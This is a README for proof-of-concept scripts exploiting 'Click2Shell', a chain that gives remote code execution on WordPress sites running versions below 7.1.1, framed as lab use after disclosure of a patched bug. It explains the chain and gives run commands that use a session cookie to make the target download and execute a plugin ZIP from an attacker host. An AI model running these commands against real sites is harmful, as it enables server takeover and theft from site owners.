# Click2Shell — WordPress Pre-Auth RCE Chain (PoC)

Python proof-of-concept scripts for **Click2Shell**, the WordPress pre-authentication
remote-code-execution chain publicly disclosed by the **pwn.ai research team**
([pwn.ai/blog/click2shell](https://pwn.ai/blog/click2shell), disclosed September 18, 2026).

> ⚠️ **Lab use only.** Test exclusively against isolated WordPress installations you
> own or are explicitly authorized to test. The Core issue is **patched in WordPress
> 7.1.1** (released September 17, 2026) — verify your lab target runs a vulnerable
> version (< 7.1.1).

## What Click2Shell is

Click2Shell chains three primitives into full pre-auth RCE against WordPress Core:

1. **Theme-preview selector injection (WordPress Core < 7.1.1).** A crafted
   theme-preview URL causes a logged-in administrator's browser to install an
   official WordPress.org catalog theme — no "Install" click required.
2. **Pre-activation PHP loading via the Customizer.** Theme code is loaded
   before the theme is ever activated, so attacker-influenced theme PHP runs
   inside the victim's session.
3. **Unprotected AJAX plugin installer (Mobile Repair Zone ≤ 2.5.4).** The
   theme exposes an AJAX endpoint that installs an arbitrary plugin ZIP from a
   URL without proper capability checks, leading to PHP execution on the server.

## Files

| File | What it does |
|---|---|
| `click2shell_poc.py` | Full chain: serves the attack page, stages the plugin ZIP, and walks through theme install → AJAX plugin install → RCE marker |
| `click2shell_forced_install_poc.py` | Standalone demo of primitive #1 — force-installs a catalog theme through the selector-injection URL |
| `click2shell_ajax_installer_poc.py` | Standalone demo of primitive #3 — drives the theme's unprotected AJAX installer to install a plugin ZIP |

## Usage

Requirements: Python 3 (only the standard library — no extra packages).

```bash
# 1. Force-install a theme via the crafted preview URL (primitive #1)
python3 click2shell_forced_install_poc.py --target http://wp-lab.local \
    --theme twentytwenty --lhost 192.168.1.10 --lport 8001 --verify

# 2. Use the theme's AJAX installer to install a plugin ZIP (primitive #3)
python3 click2shell_ajax_installer_poc.py --target http://wp-lab.local \
    --theme mobile-repair-zone \
    --cookie "wordpress_logged_in_xxx=..." \
    --package http://192.168.1.10:8000/proof.zip --serve-zip

# 3. Full chain
python3 click2shell_poc.py --target http://wp-lab.local \
    --lhost 192.168.1.10 --lport 8000 --theme mobile-repair-zone
# then have the logged-in admin visit http://192.168.1.10:8000/
```

Key options:

- `--target` — base URL of your lab WordPress install
- `--theme` — catalog theme slug to install / vulnerable theme slug
- `--lhost` / `--lport` — interface and port the PoC serves its attack page / ZIP on
- `--cookie` — any logged-in user's `Cookie` header value (for the AJAX primitive)
- `--package` — URL of the plugin ZIP the theme should fetch and install
- `--verify` / `--serve-zip` / `--stage2` — helper flags, see `--help` on each script

## How the chain works (summary)

1. The attack page tricks the admin's browser into loading a theme-preview URL
   carrying the selector-injection payload. WordPress installs the catalog theme
   automatically.
2. The Customizer pre-activation load pulls the theme's PHP into the request
   lifecycle before activation.
3. The theme's AJAX handler (`admin-ajax.php`) is called with a `package` URL;
   lacking capability checks, it downloads and installs the attacker's plugin ZIP.
4. The unpacked plugin's PHP executes as the WordPress server user — remote code
   execution. The bundled proof plugin only runs `id`-style markers and cleans up.

## Payload notes

The disclosure's code blocks did not render in the copy of the article these PoCs
were reconstructed from, so the exact selector-injection strings and AJAX
action/parameter names are marked as **templates** in the scripts (`SELECTOR_PAYLOAD`,
`AJAX_ACTION`). Copy the verbatim strings from the original article into those
constants before running against your lab.

## Credits

- **Research & disclosure:** the pwn.ai research team —
  [Click2Shell: WordPress Pre-Auth RCE](https://pwn.ai/blog/click2shell)
- **Prior related work:** pwn.ai's XSS2Shell chain (CVE-2026-64638) and Paulos
  Yibelo's Same-Origin Method Execution (SOME) technique
- PoC scripts in this repo are independent reconstructions for lab/educational use.

## References

- Disclosure: <https://pwn.ai/blog/click2shell>
- Patch: WordPress 7.1.1 (September 17, 2026)
- Related: <https://pwn.ai/blog/xss2shell>
